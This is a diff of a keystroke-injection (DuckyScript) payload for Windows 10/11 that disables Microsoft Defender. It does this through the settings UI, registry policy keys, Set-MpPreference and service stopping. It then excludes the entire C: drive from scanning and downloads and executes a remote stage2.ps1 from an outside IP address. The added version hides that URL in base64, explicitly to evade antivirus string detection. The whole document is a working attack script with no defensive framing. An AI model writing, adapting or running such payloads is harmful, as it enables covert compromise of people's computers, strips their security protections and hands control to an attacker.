@@ -1,6 +1,6 @@
 REM Title: XEPEL-Hidden-Access
 REM Author: XEPEL
-REM Description: Force scroll top, precise RT protection toggle, admin PS execution
+REM Description: Disables Defender via UI + registry + encoded IEX pull
 REM Target: Windows 10/11
 
 REM ── Step 1: Open Windows Security ──
@@ -58,14 +58,26 @@ LEFT
 ENTER
 DELAY 2000
 
-REM ── Step 11: Kill remaining Defender processes from admin PS ──
+REM ── Step 11: Disable Defender via registry ──
+STRINGLN reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+DELAY 500
+STRINGLN reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+DELAY 500
+STRINGLN reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+DELAY 500
+STRINGLN reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+DELAY 500
+
+REM ── Step 12: Kill Defender services ──
 STRINGLN Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -MAPSReporting 0
 DELAY 500
 STRINGLN Stop-Service WinDefend -Force
 DELAY 500
-STRINGLN Stop-Process -Name MsMpEng -Force
+
+REM ── Step 13: Add full drive exclusion ──
+STRINGLN Add-MpPreference -ExclusionPath 'C:\'
 DELAY 500
 
-REM ── Step 12: Pull and execute stage2.ps1 from VPS ──
-STRINGLN IEX (New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')
-DELAY 500
+REM ── Step 14: Pull stage2.ps1 encoded to bypass AV string detection ──
+STRINGLN powershell -c "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE1My43NS44Mi4xOTgvc3RhZ2UyLnBzMQ=='));IEX (New-Object Net.WebClient).DownloadString($u)"
+DELAY 1000
